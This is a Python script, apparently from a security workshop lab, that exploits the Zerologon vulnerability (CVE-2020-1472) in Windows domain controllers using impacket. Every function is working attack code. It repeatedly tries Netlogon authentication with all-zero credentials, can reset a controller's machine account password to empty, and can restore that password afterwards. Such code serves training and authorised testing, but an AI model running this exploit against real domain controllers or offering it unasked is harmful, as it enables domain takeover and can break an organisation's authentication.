#!/usr/bin/env python3
"""Zerologon (CVE-2020-1472) vulnerability tester and exploiter.

For use in SIT CYBERH4TS x AiSP's ZeroLogon internship workshop lab. Based on
work by dirkjanm (https://github.com/dirkjanm/CVE-2020-1472) and Secura
(https://github.com/SecuraBV/CVE-2020-1472).
"""

import argparse
import sys
from binascii import unhexlify
from struct import pack, unpack
from impacket.dcerpc.v5 import epm, nrpc, transport
from impacket.dcerpc.v5.dtypes import NULL
from tqdm import tqdm

MAX_ATTEMPTS = 2000  # Maximum number of authentication attempts (0.04% failure rate)
WIN10_FLAGS = 0x212FFFFF  # Windows 10 compatible flags for authentication


def main():
    parser = argparse.ArgumentParser(
        description="Zerologon (CVE-2020-1472) tester/exploiter"
    )
    parser.add_argument("dc_name", help="NetBIOS name of the DC")
    parser.add_argument("dc_ip", help="IP address of the DC")
    parser.add_argument(
        "--reset", action="store_true", help="Reset machine account password"
    )
    parser.add_argument("--restore", metavar="HEX", help="Restore password from hex")
    args = parser.parse_args()

    dc_name = args.dc_name.rstrip("$")

    try:
        if args.restore:
            restore_password(dc_name, args.dc_ip, dc_name, args.restore)
        else:
            success = perform_attack(f"\\\\{dc_name}", args.dc_ip, dc_name, args.reset)
            sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\nInterrupted.")
        sys.exit(130)
    except Exception as e:
        print(f"\nError: {e}", file=sys.stderr)
        sys.exit(2)


def create_rpc_connection(dc_ip: str) -> transport.DCERPC_v5:
    """Establish RPC connection to the DC's Netlogon service."""
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    return rpc_con


def attempt_zerologon(
    dc_handle: str, dc_ip: str, target_computer: str
) -> transport.DCERPC_v5 | None:
    """Attempt Zerologon authentication with all-zero credentials."""
    rpc_con = create_rpc_connection(dc_ip)
    # Server challenge with all-zero client challenge
    nrpc.hNetrServerReqChallenge(
        rpc_con, f"{dc_handle}\x00", f"{target_computer}\x00", b"\x00" * 8
    )

    try:
        # Authenticate with all-zero credentials
        response = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            f"{dc_handle}\x00",
            f"{target_computer}$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            f"{target_computer}\x00",
            b"\x00" * 8,
            WIN10_FLAGS,
        )
        return rpc_con if response["ErrorCode"] == 0 else None
    except nrpc.DCERPCSessionError as e:
        # Access denied indicates failed authentication
        if e.get_error_code() == 0xC0000022:
            return None
        # Other errors are unexpected
        raise


def attempt_password_reset(
    dc_handle: str, target_computer: str, rpc_con: transport.DCERPC_v5
) -> bool:
    """Reset the machine account password to empty."""
    request = nrpc.NetrServerPasswordSet2()
    request["PrimaryName"] = f"{dc_handle}\x00"
    request["AccountName"] = f"{target_computer}$\x00"
    request["ComputerName"] = f"{target_computer}\x00"
    request["ClearNewPassword"] = b"\x00" * 516  # Set new password to empty
    request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator["Credential"] = b"\x00" * 8
    authenticator["Timestamp"] = 0
    request["Authenticator"] = authenticator

    try:
        rpc_con.request(request)
        return True
    except nrpc.DCERPCSessionError as e:
        # Access denied indicates failed authentication
        if e.get_error_code() == 0xC0000022:
            return False
        # Other errors are unexpected
        raise


def restore_password(
    netbios_name: str, target_ip: str, username: str, hex_password: str
) -> None:
    """Restore the DC password after Zerologon exploitation."""
    print("Restoring original password...")
    rpc_con = create_rpc_connection(target_ip)

    # Authenticate with empty password (post-Zerologon state)
    client_key = b"\x00" * 8
    server_challenge = nrpc.hNetrServerReqChallenge(
        rpc_con, NULL, f"{netbios_name}\x00", client_key
    )["ServerChallenge"]
    session_key = nrpc.ComputeSessionKeyAES("", client_key, server_challenge)
    credential = nrpc.ComputeNetlogonCredentialAES(client_key, session_key)

    try:
        nrpc.hNetrServerAuthenticate3(
            rpc_con,
            f"\\\\{netbios_name}\x00",
            f"{username}$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            f"{netbios_name}\x00",
            credential,
            WIN10_FLAGS,
        )
    except Exception as e:
        # Ignore downgrade detected error
        if "STATUS_DOWNGRADE_DETECTED" not in str(e):
            raise

    # Build password change request
    password = unhexlify(hex_password)
    password_data = (
        b"\x00" * (512 - len(password)) + password + pack("<L", len(password))
    )
    client_credential = pack("<Q", unpack("<Q", credential)[0] + 10)

    request = nrpc.NetrServerPasswordSet2()
    request["PrimaryName"] = f"\\\\{netbios_name}\x00"
    request["AccountName"] = f"{netbios_name}$\x00"
    request["ComputerName"] = f"{netbios_name}\x00"
    request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    request["ClearNewPassword"] = nrpc.ComputeNetlogonCredentialAES(
        password_data, session_key
    )
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator["Credential"] = nrpc.ComputeNetlogonCredentialAES(
        client_credential, session_key
    )
    authenticator["Timestamp"] = 10
    request["Authenticator"] = authenticator

    rpc_con.request(request)
    print("Success! Password restored.")


def perform_attack(
    dc_handle: str, dc_ip: str, target_computer: str, reset: bool = False
) -> bool:
    """Perform Zerologon attack with optional password reset."""
    print(f"Attacking {target_computer} ({dc_ip})...")

    rpc_con = None
    for _ in tqdm(range(MAX_ATTEMPTS), desc="Authenticating", unit=" attempt"):
        rpc_con = attempt_zerologon(dc_handle, dc_ip, target_computer)
        if rpc_con:
            break

    if not rpc_con:
        print("\nTarget is not vulnerable, likely patched.")
        return False
    print("\nSuccess! Target is vulnerable to Zerologon.")

    if reset:
        print("\nResetting password...")
        if not attempt_password_reset(dc_handle, target_computer, rpc_con):
            print("\nFailed to reset password.")
            return False
        print("\nSuccess! Password is now empty.")

    return True


if __name__ == "__main__":
    main()
